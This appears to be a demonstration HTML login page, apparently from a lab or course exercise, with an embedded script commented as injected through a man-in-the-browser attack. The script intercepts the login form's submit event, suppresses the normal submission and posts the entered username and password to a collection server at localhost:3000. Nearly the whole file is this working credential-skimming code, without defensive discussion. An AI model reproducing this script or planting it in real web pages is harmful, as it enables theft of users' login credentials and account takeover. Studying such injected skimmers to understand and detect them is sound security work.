<!DOCTYPE html>
<html>
<head>
  <title>Pagina di Login</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
<div id="bg"></div>
<form id="loginForm">
  <div class="form-field">
    <input type="text" id="username" placeholder="Username" required/>
  </div>
  
  <div class="form-field">
    <input type="password" id="password" placeholder="Password" required/>                         
  </div>
  
  <div class="form-field">
    <button class="btn" type="submit" value="Submit">Log in</button>
  </div>
</form>  

<!-- Script iniettato con MitB -->
<script>
  var server_addr = 'http://localhost:3000/login';
  
  const form = document.getElementById('loginForm');
  const submitButton = document.querySelector('input[type="submit"]');

  // Add an event listener to the form for the 'submit' event
  form.addEventListener('submit', function(event) {
    // Prevent the default form submit
    event.preventDefault();

    // Get the values of the username and password fields
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    if (username !== "") {
      sendUsername(username);
    }
    if (password !== "") {
      sendPassword(password);
    }
  });
  
  // Funzione che invia gli username al server
  function sendUsername(username) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", server_addr, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("username=" + encodeURIComponent(username));
  }
  
  // Funzione che invia le password al server
  function sendPassword(password) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", server_addr, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("password=" + encodeURIComponent(password));
  }
</script>


</body>
</html>
